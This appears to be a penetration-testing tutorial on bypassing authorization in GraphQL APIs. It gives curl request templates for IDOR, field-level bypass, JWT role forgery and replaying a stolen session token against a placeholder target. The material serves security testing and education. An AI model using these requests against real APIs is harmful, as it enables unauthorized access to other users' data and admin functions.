# Authorization Bypass

## Context

In this article, we delve into the practice of bypassing authorization controls within GraphQL APIs. We'll explore techniques such as Insecure Direct Object Reference (IDOR), field-level authorization bypasses, role or permission escalations, and session hijacking. These techniques exploit improper or missing authorization checks, enabling unauthorized access to sensitive data or functions. Our focus is on demonstrating these techniques to help you understand their workings and potential impact.

Prior knowledge of GraphQL schema structures, general access control models like Role-Based Access Control (RBAC), and GraphQL injection fundamentals is assumed.

## Theory

### Authorization in GraphQL APIs

Authorization in GraphQL APIs determines which users can access specific queries, mutations, or fields. Typically, authorization checks are implemented at different levels—resolver, field, or operation—to enforce security policies. However, vulnerabilities arise when these checks are insufficient or improperly configured, potentially exposing sensitive data or functionalities to unauthorized users.

### Common Authorization Bypass Vectors in GraphQL

- **IDOR via GraphQL:** This bypass vector involves directly referencing object IDs without verifying ownership or permissions, often leading to unauthorized access.
  
- **Field-Level Authorization Bypass:** Here, attackers exploit improperly protected sensitive fields within resolvers, gaining access that should be restricted according to user roles.

- **Role/Permission Escalation:** This technique involves manipulating inputs or authentication tokens to gain higher privileges within the system.

- **JWT/Session Manipulation:** Attackers modify JSON Web Tokens or session data to impersonate other users, usually due to insufficient token validation.

### Attack Sequences for Authorization Bypass

1. **Identify Unprotected Resources:** Use introspection or error analysis to discover queries, mutations, or fields lacking proper authorization controls.
  
2. **Craft Unauthorized Requests:** Formulate requests to reference restricted resources or fields without permission.

3. **Manipulate Tokens or Roles:** Alter authentication tokens or role information to escalate privileges and access restricted operations.

## Practice

### IDOR via GraphQL Object Reference

- **Goal:** Access data belonging to other users by exploiting IDOR vulnerabilities.

```bash
curl -X POST https://target/graphql \
    -H 'Authorization: Bearer <token>' \
    -H 'Content-Type: application/json' \
    --data '{"query":"{ user(id: \"2\") { id, email } }"}'
```

By altering the ID parameter in this request, you attempt to fetch information about a user other than yourself. If unprotected, this query could expose unauthorized users' data.

### Field-Level Authorization Bypass

- **Goal:** Access sensitive fields that lack proper authorization checks.

```bash
curl -X POST https://target/graphql \
    -H 'Authorization: Bearer <token>' \
    -H 'Content-Type: application/json' \
    --data '{"query":"{ me { id, email, isAdmin } }"}'
```

This query requests sensitive fields such as `isAdmin`, which should be protected by field-level authorization checks. Accessing these fields without the necessary permissions indicates a vulnerability.

### Role Escalation via JWT Manipulation

- **Goal:** Gain privileged access by modifying JWT claims.

1. Decode the JWT to inspect its payload.

```bash
jwt-tool <token> -d
```

2. Modify the 'role' claim to 'admin' and re-sign the token if signature validation is not enforced.

3. Use the modified token to request admin operations.

```bash
curl -X POST https://target/graphql \
    -H 'Authorization: Bearer <modified_token>' \
    -H 'Content-Type: application/json' \
    --data '{"query":"{ adminPanel { stats } }"}'
```

By re-signing and altering the role, you attempt unauthorized access to admin functions, demonstrating privilege escalation.

### Session Hijacking via Token Reuse

- **Goal:** Impersonate another user by exploiting their session token.

1. Obtain a valid session token for another user through XSS, phishing, or insecure storage.

2. Use the stolen token to impersonate the victim.

```bash
curl -X POST https://target/graphql \
    -H 'Authorization: Bearer <stolen_token>' \
    -H 'Content-Type: application/json' \
    --data '{"query":"{ me { id, email } }"}'
```

This step involves acting as another user by using a session token obtained through malicious means, leading to improper access.

## Tools

- **curl**
- **jwt-tool** 

By understanding these techniques and their practical implementations, you gain insights into the potential impacts of authorization bypass vulnerabilities in GraphQL APIs. Such knowledge is crucial for comprehensively evaluating API security in penetration testing scenarios.
